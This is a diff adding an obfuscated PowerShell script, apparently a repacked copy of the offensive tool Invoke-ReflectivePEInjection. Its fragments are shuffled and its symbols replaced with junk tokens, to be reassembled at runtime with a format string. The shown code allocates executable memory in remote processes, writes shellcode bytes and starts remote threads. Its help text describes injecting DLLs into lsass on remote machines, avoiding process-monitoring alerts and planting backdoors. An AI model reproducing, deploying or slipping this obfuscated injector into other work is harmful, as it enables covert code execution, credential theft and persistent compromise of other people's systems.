@@ -1,0 +1,2953 @@
+ (("{58}{13}{20}{11}{27}{74}{115}{112}{77}{25}{107}{1}{26}{98}{135}{70}{23}{123}{99}{52}{3}{54}{79}{72}{127}{49}{68}{111}{125}{55}{12}{22}{7}{90}{85}{83}{81}{130}{102}{44}{61}{106}{134}{96}{105}{93}{109}{37}{76}{35}{89}{0}{120}{16}{78}{28}{131}{122}{91}{87}{42}{8}{29}{4}{92}{124}{128}{118}{82}{47}{71}{10}{117}{103}{30}{15}{18}{116}{69}{24}{19}{31}{65}{48}{129}{110}{45}{66}{73}{2}{53}{51}{6}{34}{75}{88}{21}{104}{56}{50}{67}{136}{41}{80}{46}{113}{62}{108}{5}{63}{59}{132}{101}{94}{43}{57}{32}{9}{95}{121}{64}{86}{97}{33}{36}{40}{14}{119}{133}{17}{114}{60}{126}{100}{39}{38}{84}"-f 'opServices.Marshal]::SizeOf([Type]CXljValue.GetType()) * 2
+        CXljHex = GEy90x{0:XCXlj(CXljValueSize)}GEy9 -f [Int64]CXljValue #Passing a IntPtr to this doesne9Mjt work well. Cast to Int64 first.
+
+        return CXljHex
+    }
+	
+	
+	','0b) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_NT_OPTIONAL_HDR64_MAGICe9Mj, [UInt16] 0x20b) Jbi write-host
+		CXljMagicType = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name MagicType -Value CXljMagicType
+
+		#Enum SubSystemType
+		CXljTypeBuilder = CXljModuleBuilder.DefineEnum(e9MjSubSystemTypee9Mj, e9MjPublice9Mj, [UInt16])
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_UNKNOWNe9Mj, [UInt16] 0) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_NATIVEe9Mj, [UInt16] 1) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_WINDOWS_GUIe9Mj, [UInt16] 2) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_WINDOWS_CUIe9Mj, [UInt16] 3) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_POSIX_CUIe9Mj, [UInt16] 7) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_WINDOWS_CE_GUIe9Mj, [UInt16] 9) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_EFI_APPLICATIONe9Mj, [UInt16] 10) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVERe9Mj, [UInt16] 11) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVERe9Mj, [UInt16] 12) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYSTEM_EFI_ROMe9Mj, [UInt16] 13) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjIMAGE_SUBSYS','
+			else
+			{
+				if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_EXECUTE_WRITECOPY
+				}
+				else
+				{
+					CXljProtectionFlag = CXljWin32Constants.PAGE_EXECUTE
+				}
+			}
+		}
+		else
+		{
+			if ((CXljSectionCharacteristics -band CXljWin32Constants.IMAGE_SCN_MEM_READ) -gt 0)
+			{
+				if ((CXljSectionCharacteristics -band C','Mj, [UInt32], e9MjPublice9Mj)).SetOffset(20) Jbi write-host
+		(CXljTypeB','XljNtHea','XljInfo[0], CXljInfo[1], [UInt64]CXljInfo[2]) Jbi write-host
+			
+			CXljWin32Functions.VirtualProtect.Invoke(CXljInfo[0], [UInt32]CXljInfo[2], [UInt32]CXljOldProtectFlag, [Ref]CXljOldProtectFlag) Jbi write-host
+		}
+	}
+
+
+	#####################################
+	##########    FUNCTIONS   ###########
+	#####################################
+	Function Get-MemoryProcAddress
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[IntPtr]
+		CXljPEHandle,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[String]
+		CXljFunctionName
+		)
+		
+		CXljWin32Types = Get-Win32Types
+		CXljWin32Constants = Get-Win32Constants
+		CXljPEInfo = Get-PEDetailedInfo -PEHandle CXljPEHandle -Win32Types CXljWin32Types -Win32Constants CXljWin32Constants
+		
+		#Get the export table
+	','vices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_SECTION_HEAD','e(e9MjIMAGE_BASE_RELOCATIONe9Mj, CXljAttributes, [System.ValueType], 8)
+		CXljTypeBuilder.DefineField(e9MjVirtualAddresse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjSizeOfBlocke9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_BA','ation which will be needed for allocating memory and writing the PE to memory
+		CXljPE','fectivePEHandle = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, CXljLoadAddr, [UIntPtr]CXljPEInfo.SizeOfImage, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_EXECUTE_READWRITE)
+			if (CXljEffectivePEHandle -eq [IntPtr]::Zero)
+			{
+				Throw GEy9Unable to allocate memory in the remote process. If the PE being loaded doesne9Mjt support ASLR, it could be that the requested base address of the PE is already in useGEy9
+			}','s.GetProcAddress.Invoke(CXljKernel32Handle, GEy9GetProcAddressGEy9) #Kernel32 loaded to the same address for all processes
+
+		
+		#Allocate memory for the address returned by GetProcAddress
+		CXljGetProcAddressRetMem = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]CXljPtrSize, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_READWRITE)
+		if (CXljGetProcAddressRetMem -eq [IntPtr]::Zero)
+		{
+			Throw GEy9Unable to allocate memory in the remote process for the return value of GetProcAddressGEy9
+		}
+		
+		
+		#Write Shellcode to the remote process which will call GetProcAddress
+		#Shellcode: GetProcAddress.asm
+		[Byte[]]CXljGetProcAddressSC = @()
+		if (CXljPEInfo.PE64Bit -eq CXljtrue)
+		{
+			CXljGetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
+			CXljGetProcAddressSC2 = @(0x48, 0xba)
+			CXljGetProcAddressSC3 = @(0x48, 0xb8)
+			CXljGetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
+			CXljGetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
+		}
+		else
+		{
+			CXljGetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
+			C','NT: For DLLs being loaded remotely, only Void is supported.
+	
+.PARAMETER ExeArgs
+
+Optional, arguments to pass to the executable being reflectively loaded.
+	
+.PARAMETER ProcName
+
+Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
+
+.PARAMETER ProcId
+
+Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.
+
+.PARAMETER ForceASLR
+
+Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesne9Mjt support ASLR. Some PEe9Mjs will work with ASLR even
+    if the compiler flags done9Mjt indicate they support it. Other PEe9Mjs will simply crash. Make sure to test this prior to using. Has no effect when
+    loading in to a remote process.
+	
+.EXAMPLE
+
+Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
+Note that the file name on the website can be any file extension.
+Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString
+
+.EXAMPLE
+
+Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local
+
+.EXAMPLE
+
+Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
+	the wchar_t* returned by WStringFunc() from all the computers.
+Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)
+
+.EXAMPLE
+
+Load DemoEXE and run it locally.
+Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs GEy9Arg1 Arg2 Arg3 Arg4GEy9
+
+.EXAMPLE
+
+Load DemoEXE and run it locally. Forces ASLR on for the EXE.
+Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs GEy9Arg1 Arg2 Arg3 Arg4GEy9 -ForceASLR
+
+.EXAMPLE
+
+Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
+Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local
+
+.EXAMPLE
+
+Load a PE from a byte array.
+Invoke-ReflectivePEInjection -PEPath (Get-Content c:IjbfDemoEXE.exe -Encoding Byte) -ExeArgs GEy9Arg1 Arg2 Arg3 Arg4GEy9
+
+.NOTES
+GENERAL NOTES:
+The script has 3 basic sets of functionality:
+1.) Reflectively load a DLL in to the PowerShell process
+	-Can return DLL output to user when run remotely or locally.
+	-Cleans up memory in the PS process once the DLL finishes executing.
+	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
+	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
+2.) Reflectively load an EXE in to the PowerShell process.
+	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
+	-C','ield(e9MjNumberOfRelocationse9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjNumberOfLinenumberse9Mj, [UInt16], e9MjPublice9Mj) Jbi write-host
+		CXljTypeBuilder.DefineField(e9MjCharacteristicse9Mj, [UInt32], e9MjPublice9Mj) Jbi write-host
+		CXljIMAGE_SECTION_HEADER = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value CXljIMAGE_SECTION_HEADER
+
+		#Struct IMAGE_BASE_RELOCATION
+		CXljAttributes = e9MjAutoLayout, AnsiClass,','ames to run the script on.
+
+.PARAMETER FuncReturnType
+
+Optional, the return type of the function being called in the DLL.','ak
+				}
+				else
+				{
+					Start-Sleep -Seconds 1
+				}
+			}
+		}
+		
+		return @(CXljPEInfo.PEHandle, CXljEffectivePEHandle)
+	}
+	
+	
+	Function Invoke-MemoryFreeLibrary
+	{
+		Param(
+		[Parameter(Position=0, Mandatory=CXljtrue)]
+		[IntPtr]
+		CXljPEHandle
+		)
+		
+		#Ge','SC4 -MemoryAddress CXljSCPSMem
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljGetProcAddressSC4.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljGetProcAddressRetMem, CXljSCPSMem, CXljfalse)
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+		Write-BytesToMemory -Bytes CXljGetProcAddressSC5 -MemoryAddress CXljSCPSMem
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljGetProcAddressSC5.Length)
+		
+		CXljRSCAddr = CXljWin32Functions.VirtualAllocEx.Invoke(CXljRemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]CXljSCLength, CXljWin32Constants.MEM_COMMIT -bor CXljWin32Constants.MEM_RESERVE, CXljWin32Constants.PAGE_EXECUTE_READWRITE)
+		if (CXljRSCAddr -eq [IntPtr]::Zero)
+		{
+			Throw GEy9Unable to allocate memory in the remote process for shellcodeGEy9
+		}
+		[UIntPtr]CXljNumBytesWritten = [UIntPtr]::Zero
+		CXljSuccess = CXljWin32Functions.WriteProcessMemory.Invoke(CXljRemoteProcHandle, CXljRSCAddr, CXljSCPSMemOriginal, [UIntPtr][UInt64]CXljSCLength, [Ref]CXljNumBytesWritten)
+		if ((CXljSuccess -eq CXljfalse) -or ([UInt64]CXljNumBytesWritten -ne [UInt64]CXljSCLength))
+		{
+			Throw GEy9Unable to write shellcode to remote process memory.GEy9
+		}
+		
+		CXljRThreadHandle = Create-RemoteThread -ProcessHandle CXljRemoteProcHandle -StartAddress CXljRSCAddr -Win32Functions CXljWin32Functions
+		CXljResult = CXljWin32Functions.WaitForSingleObject.Invoke(CXljRThreadHandle, 20000)
+		if (CXljResult -ne 0)
+		{
+			Throw GEy9Call to CreateRemoteThread to call GetProcAddress failed.GEy9
+		}
+		
+		#The process address is written to memory in the remote process at address CXljGetProcAddressRetMem, read this memory
+		[IntPtr]CXljReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(CXljPtrSize)
+		CXljResult = CXljWin32Functions.ReadProcessMemory.Invoke(CXljRemoteProcHandle, CXljGetProcAddressRetMem, CXljReturnValMem, [UIntPtr][UInt64]CXljPtrSize, [Ref]CXljNumBytesWritten)
+		if ((CXljResult -eq CXljfalse) -or (CXljNumBytesWritten -eq 0))
+		{
+			Throw GEy9Call to ReadProcessMemory failedGEy9
+		}
+		[IntPtr]CXljProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljReturnValMem, [Type][IntPtr])
+
+        #Cleanup remote process memory
+		CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljRSCAddr, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+		CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljGetProcAddressRetMem, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+
+        if (-not CXljLoadByOrdinal)
+        {
+            CXljWin32Functions.VirtualFreeEx.Invoke(CXljRemoteProcHandle, CXljRFuncNamePtr, [UIntPtr][UInt64]0, CXljWin32Constants.MEM_RELEASE) Jbi write-host
+        }
+		
+		return CXljProcAddress
+	}
+
+
+	Function Copy-Sections
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[Byte[]]
+		CXljPEBytes,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljPEInfo,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types
+		)
+		
+		for( CXlji = 0; CXlji -lt CXljPEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; CXlji++)
+		{
+			[IntPtr]CXljSectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.SectionHeaderPtr) (CXlji * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_SECTION_HEADER)))
+			CXljSectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljSectionHeaderPtr, [Type]CXljWin32Types.IMAGE_SECTION_HEADER)
+		
+			#Address to copy the section to
+			[IntPtr]CXljSectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljSectionHeader.VirtualAddress))
+			
+			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
+			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
+			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that ','	[IntPtr]CXljFinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned (CXljStartAddress) (CXljSize))
+		}
+		else
+		{
+			CXljFinalEndAddress = CXljEndAddress
+		}
+		
+		CXljPEEndAddress = CXljPEInfo.EndAddress
+		
+		if ((Compare-Val1GreaterThanVal2AsUInt (CXljPEInfo.PEHandle) (CXljStartAddress)) -eq CXljtrue)
+		{
+			Throw GEy9Trying to write to memory smaller than allocated address range. CXljDebugStringGEy9
+		}
+		if ((Compare-Val1GreaterThanVal2AsUInt (CXljFinalEndAddress) (CXljPEEndAddress)) -eq CXljtrue)
+		{
+			Throw GEy9Trying to write to memory greater than allocated address range. CXljDebugStringGEy9
+		}
+	}
+	
+	
+	Function Write-BytesToMemory
+	{
+		Param(
+			[Parameter(Position=0, Mandatory = CXljtrue)]
+			[Byte[]]
+			CXljBytes,
+			
+			[Parameter(Position=1, Mandatory = CXljtrue)]
+			[IntPtr]
+			CXljMemoryAddress
+		)
+	
+		for (CXljOffset = 0; CXljOffset -lt CXljBytes.Length; CXljOffset++)
+		{
+			[System.Runtime.InteropServices.Marshal]::WriteByte(CXljMemoryAddress, CXljOffset, CXljBytes[CXljOffset])
+		}
+	}
+	
+
+	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+	Function Get-DelegateType
+	{
+	    Param
+	    (
+	        [OutputType([Type])]
+	        
+	        [Parameter( Position = 0)]
+	        [Type[]]
+	        CXljParameters = (New-Object Type[](0)),
+	        
+	        [Parameter( Position = 1 )]
+	        [Type]
+	        CXljReturnType = [Void]
+	    )
+
+	    CXljDomain = [AppDomain]::CurrentDomain
+	    CXljDynAssembly = New-Object System.Reflection.AssemblyName(e9MjReflectedDelegatee9Mj)
+	    CXljAssemblyBuilder = CXljDomain.DefineDynamicAssembly(CXljDynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+	    CXljModuleBuilder = CXljAssemblyBuilder.DefineDynamicModule(e9MjInMemoryModulee9Mj, CXljfalse)
+	    CXljTypeBuilder = CXljModuleBuilder.DefineType(e9MjMyDelegateTypee9Mj, e9MjClass, Public, Sealed, AnsiClass, AutoClasse9Mj, [System.MulticastDelegate])
+	    CXljConstructorBuilder = CXljTypeBuilder.DefineConstructor(e9MjRTSpecialName, HideBySig, Publice9Mj, [System.Reflection.CallingConventions]::Standard, CXljParameters)
+	    CXljConstructorBuilder.SetImplementationFlags(e9MjRuntime, Managede9Mj)
+	    CXljMethodBuilder = CXljTypeBuilder.DefineMethod(e9MjInvokee9Mj, e9MjPublic, HideBySig, NewSlot, Virtuale9Mj, CXljReturnType, CXljParameters)
+	    CXljMethodBuilder.SetImplementationFlags(e9MjRuntime, Managede9Mj)
+	    
+	    Write-Output CXljTypeBuilder.CreateType()
+	}
+
+
+	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
+	Function Get-ProcAddress
+	{
+	    Param
+	    (
+	        [OutputType([IntPtr])]
+	    
+	        [Parameter( Position = 0, Mandatory = CXljTrue )]
+	        [String]
+	        CXljModule,
+	        
+	        [Parameter( Position = 1, Mandatory = CXljTrue )]
+	        [String]
+	        CXljProcedure
+	    )
+
+	    # Get a reference to System.dll in the GAC
+	    CXljSystemAssembly ','	#If a remote process to inject in to is specified, get a handle to it
+		if ((CXljProcId -ne CXljnull) -and (CXljProcId -ne 0) -and (CXljProcName -ne CXljnull) -and (CXljProcName -ne GEy9GEy9))
+		{
+			Throw GEy9Cane9Mjt supply a ProcId and ProcName, choose one or the otherGEy9
+		}
+		elseif (CXljProcName -ne CXljnull -and CXljProcName -ne GEy9GEy9)
+		{
+			CXljProcesses = @(Get-Process -Name CXljProcName -ErrorAction SilentlyContinue)
+			if (CXljProcesses.Count -eq 0)
+			{
+				Throw GEy9Cane9Mjt find process CXljProcNameGEy9
+			}
+			elseif (CXljProcesses.Count -gt 1)
+			{
+				CXljProcInfo = Get-Process Jbi where { CXlj','we can throw away,
+			#    so tru','pe = CXljRelocationInfo -band 0xF000
+				for (CXljj = 0; CXljj -lt 12; CXljj++)
+				{
+					CXljRelocType = [Math]::Floor(CXljRelocType / 2)
+				}
+
+				#For DLLe9Mjs there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
+				#This appears to be true for EXEe9Mjs as well.
+				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
+				if ((CXljRelocType -eq CXljWin32Constants.IMAGE_REL_BASED_HIGHLOW) Ppv
+						-or (CXljRelocType -eq CXljWin32Constants.IMAGE_REL_BASED_DIR64))
+				{			
+					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
+					[IntPtr]CXljFinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljMemAddrBase) ([Int64]CXljRelocOffset))
+					[IntPtr]CXljCurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljFinalAddr, [Type][IntPtr])
+		
+					if (CXljAddDifference -eq CXljtrue)
+					{
+						[IntPtr]CXljCurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljCurrAddr) (CXljBaseDifference))
+					}
+					else
+					{
+						[IntPtr]CXljCurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]CXljCurrAddr) (CXljBaseDifference))
+					}				
+
+					[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljCurrAddr, CXljFinalAddr, CXljfalse) Jbi write-host
+				}
+				elseif (CXljRelocType -ne CXljWin32Constants.IMAGE_REL_BASED_ABSOLUTE)
+				{
+					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we done9Mjt actually do anything with it
+					Throw GEy9Unknown relocation found, relocation value: CXljRelocType, relocationinfo: CXljRelocationInfoGEy9
+				}
+			}
+			
+			CXljBaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljBaseRelocPtr) ([Int64]CXljBaseRelocationTable.SizeOfBlock))
+		}
+	}
+
+
+	Function Import-DllImports
+	{
+		Param(
+		[Parameter(Position = 0, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljPEInfo,
+		
+		[Parameter(Position = 1, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Functions,
+		
+		[Parameter(Position = 2, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Types,
+		
+		[Parameter(Position = 3, Mandatory = CXljtrue)]
+		[System.Object]
+		CXljWin32Constants,
+		
+		[Parameter(Position = 4, Mandatory = CXljfal',' Default: Void
+	Options: String, WString, Void. See notes for more information.
+	IMPORTA','ne9Mjt know why exactly.. But the msvcr DLL that a GE',' Class, Public, SequentialLayout, Sealed, BeforeFieldInite9Mj
+		CXljTypeBuilder = CXljModuleBuilder.DefineTyp','t-Null
+		(CXljTypeBuilder.DefineField(e9MjSizeOfUninitializedDatae9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(12) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjAddressOfEntryPointe9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(16) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjBaseOfCodee9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(20) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjImageBasee9Mj, [UInt64], e9MjPublice9Mj)).SetOffset(24) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjSectionAlignmente9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(32) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjFileAlignmente9Mj, [UInt32], e9MjPublice9Mj)).SetOffset(36) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorOperatingSystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(40) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorOperatingSystemVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(42) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorImageVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(44) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMinorImageVersione9Mj, [UInt16], e9MjPublice9Mj)).SetOffset(46) Jbi write-host
+		(CXljTypeBuilder.DefineField(e9MjMajorSubsystemVersione9Mj, [UInt16], ','nce = 0
+		CXljAddDifference = CXljtrue #Track if the difference variable should be added or subtracted from variables
+		[UInt32]CXljImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]CXljWin32Types.IMAGE_BASE_RELOCATION)
+		
+		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
+		if ((CXljOriginalImageBase -eq [Int64]CXljPEInfo.EffectivePEHandle) Ppv
+				-or (CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
+		{
+			return
+		}
+
+
+		elseif ((Compare-Val1GreaterThanVal2AsUInt (CXljOriginalImageBase) (CXljPEInfo.EffectivePEHandle)) -eq CXljtrue)
+		{
+			CXljBaseDifference = Sub-SignedIntAsUnsigned (CXljOriginalImageBase) (CXljPEInfo.EffectivePEHandle)
+			CXljAddDifference = CXljfalse
+		}
+		elseif ((Compare-Val1GreaterThanVal2AsUInt (CXljPEInfo.EffectivePEHandle) (CXljOriginalImageBase)) -eq CXljtrue)
+		{
+			CXljBaseDifference = Sub-SignedIntAsUnsigned (CXljPEInfo.EffectivePEHandle) (CXljOriginalImageBase)
+		}
+		
+		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
+		[IntPtr]CXljBaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljPEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
+		while(CXljtrue)
+		{
+			#If SizeOfBlock == 0, we are done
+			CXljBaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljBaseRelocPtr, [Type]CXljWin32Types.IMAGE_BASE_RELOCATION)
+
+			if (CXljBaseRelocationTable.SizeOfBlock -eq 0)
+			{
+				break
+			}
+
+			[IntPtr]CXljMemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]CXljPEInfo.PEHandle) ([Int64]CXljBaseRelocationTable.VirtualAddress))
+			CXljNumRelocations = (CXljBaseRelocationTable.SizeOfBlock - CXljImageBaseRelocSize) / 2
+
+			#Loop through each relocation
+			for(CXlji = 0; CXlji -lt CXljNumRelocations; CXlji++)
+			{
+				#Get info for this relocation
+				CXljRelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]CXljBaseRelocPtr) ([Int64]CXljImageBaseRelocSize + (2 * CXlji)))
+				[UInt16]CXljRelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure(CXljRelocationInfoPtr, [Type][UInt16])
+
+				#First 4 bits is the relocation type, last 12 bits is the address offset from CXljMemAddrBase
+				[UInt16]CXljRelocOffset = CXljRelocationInfo -band 0x0FFF
+				[UInt16]CXljRelocTy','fineLiteral(e9MjI386e9Mj, [UInt16] 0x014c) J','TEM_XBOXe9Mj, [UInt16] 14) Jbi write-host
+		CXljSubSystemType = CXljTypeBuilder.CreateType()
+		CXljWin32Types Jbi Add-Member -MemberType NoteProperty -Name SubSystemType -Value CXljSubSystemType
+
+		#Enum DllCharacteristicsType
+		CXljTypeBuilder = CXljModuleBuilder.DefineEnum(e9MjDllCharacteristicsTypee9Mj, e9MjPublice9Mj, [UInt16])
+		CXljTypeBuilder.DefineLiteral(e9MjRES_0e9Mj, [UInt16] 0x0001) Jbi write-host
+		CXljTypeBuilder.DefineLiteral(e9MjRES_1e9Mj, [UInt16] 0x0002) Jbi write-host
+		CXljTypeBuilder.D','leans up memory in the PS process once the DLL finishes executing.
+	-Great for running existing pentest tools which are EXEe9Mjs without triggering process monitoring alerts.
+3.) Reflectively inject a DLL in to a remote process.
+	-Can NOT return DLL output to the user when run remotely OR locally.
+	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
+	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
+	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.
+
+
+
+DLL LOADING NOTES:
+
+PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
+If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
+return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
+remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
+applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.
+
+For DLL Loading:
+Once this script loads the DLL, it calls a function','Get a handle to the module specified
+	    CXljKern32Handle = CXljGetModuleHandle.Invoke(CXljnull, @(CXljModule))
+	    CXljtmpPtr = New-Object IntPtr
+	    CXljHandleRef = New-Object System.Runtime.InteropServices.HandleRef(CXljtmpPtr, CXljKern32Handle)
+
+	    # Return the address of the function
+	    Write-Output CXljGetProcAddress.Invoke(CXljnull,','Info Jbi Add-Member -MemberType NoteProperty -Name e9MjPE64Bite9Mj -Value (CXljNtHeadersInfo.PE64Bit)
+		CXljPEInfo Jbi Add-Member -MemberType NoteProperty -Name e9MjOriginalImageBasee9Mj -Value (C','XljSCPSMem, CXljfalse)
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljPtrSize)
+		Write-BytesToMemory -Bytes CXljGetProcAddressSC2 -MemoryAddress CXljSCPSMem
+		CXljSCPSMem = Add-SignedIntAsUnsigned CXljSCPSMem (CXljGetProcAddressSC2.Length)
+		[System.Runtime.InteropServices.Marshal]::StructureToPtr(CXljRFuncNamePtr, CXljSCPSMem, CXljfalse)
